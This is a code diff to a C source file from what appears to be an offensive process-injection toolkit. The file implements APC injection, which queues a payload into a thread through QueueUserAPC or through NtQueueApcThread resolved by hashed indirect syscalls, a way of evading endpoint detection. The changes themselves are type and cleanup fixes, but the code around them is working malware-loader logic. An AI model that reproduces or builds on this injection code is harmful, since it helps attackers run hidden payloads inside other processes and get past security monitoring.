@@ -1,6 +1,6 @@
 #include "injection.h"
 
-VOID AlertableFunction() {
+DWORD AlertableFunction() {
     HANDLE hEvent1 = NULL;
     HANDLE hEvent2 = NULL;
 
@@ -19,6 +19,8 @@ VOID AlertableFunction() {
 
     if (hEvent1) CloseHandle(hEvent1);
     if (hEvent2) CloseHandle(hEvent2);
+
+    return 0;
 }
 
 
@@ -33,18 +35,17 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
     DebugPrint("[i] QueueUserAPC with payload located at: 0x%p\n", (ULONG_PTR)pAddress);
 
 #ifdef HW_INDIRECT_SYSCALL
-    NTSTATUS		STATUS = NULL;
+    NTSTATUS		STATUS = STATUS_SUCCESS;
 
     // executing the payload via NtQueueApcThread
-    DebugPrint("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
-    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
+    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
         DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
         return FALSE;
     }
     DebugPrint("[+] DONE \n");
 #else
-    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, NULL)) {
+    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, (ULONG_PTR)NULL)) {
         DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
         VirtualFree(pAddress, 0, MEM_RELEASE);
         return FALSE;
@@ -56,7 +57,7 @@ static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSi
 }
 
 BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
-    DWORD dwThreadId = NULL;
+    DWORD dwThreadId = 0;
 
 #ifdef HW_INDIRECT_SYSCALL
     if (hProcess == NULL) {
@@ -64,7 +65,7 @@ BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPaylo
     }
 
     NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
-    NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, NULL, NULL, NULL, NULL);
+    NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, 0, 0, 0, NULL);
     if (status != STATUS_SUCCESS) {
         DebugPrint("[!] NtCreateThreadEx Failed With Error : %d \n", status);
         return FALSE;
